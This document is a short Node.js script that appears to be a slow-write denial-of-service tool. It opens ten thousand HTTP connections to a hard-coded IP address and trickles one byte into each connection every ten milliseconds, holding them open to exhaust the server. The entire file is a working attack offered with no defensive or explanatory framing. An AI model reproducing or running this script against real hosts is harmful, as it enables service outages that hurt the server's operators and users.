var http = require('http')
var url = '45.5.164.97'


var max_connection = 10000, length = 100000
var params = {
    'host': url,
    'Content-length': length
}
var connections = []

for (var i = 0; i < max_connection; i++) {
    var obj = {}
    var options = {
        port     : 80,
        host     : url,
        method   : 'GET',
        path     : '/'
    }
    obj = http.request(options);
    connections.push(obj)
}
var next = function(cnt) {
    for (var i = 0; i < max_connection; i++) {
        connections[i].write('a')
    }
    console.log(cnt)
    cnt++
    var x = setTimeout(function() {
        next(cnt)
    }, 10)
    if (cnt > length) {
        clearInterval(x)

        for(var i = 0; i < max_connection; i++) {
            connections[i].end()
        }
    }
}
next(1)